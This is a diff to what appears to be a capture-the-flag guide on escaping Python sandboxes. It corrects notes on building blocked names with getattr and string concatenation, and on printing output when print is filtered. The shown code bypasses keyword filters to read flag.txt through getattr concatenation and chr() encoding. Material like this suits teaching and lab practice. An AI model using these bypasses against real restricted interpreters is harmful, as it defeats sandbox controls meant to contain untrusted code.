@@ -32,7 +32,7 @@ Variants: `blacklist.__init__()`, repeated `blacklist.pop()`, or reassigning via
 
 ## 3. Build forbidden names
 
-`getattr` plus concatenation avoids the literal substring:
+`getattr` plus concatenation avoids the literal substring (when `__builtins__` is the module, not a dict):
 
 ```python
 getattr(__builtins__, "op" + "en")("flag.txt").read()
@@ -44,7 +44,7 @@ getattr(__builtins__, "op" + "en")("flag.txt").read()
 print(open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())
 ```
 
-If `print` is blocked, use `sys.stdout.write` or the return value of `exec` with `compile`.
+If `print` is blocked, use `sys.stdout.write` or `eval(compile(...))`; `exec` always returns `None`.
 
 ## 4. Reach the builtins
 
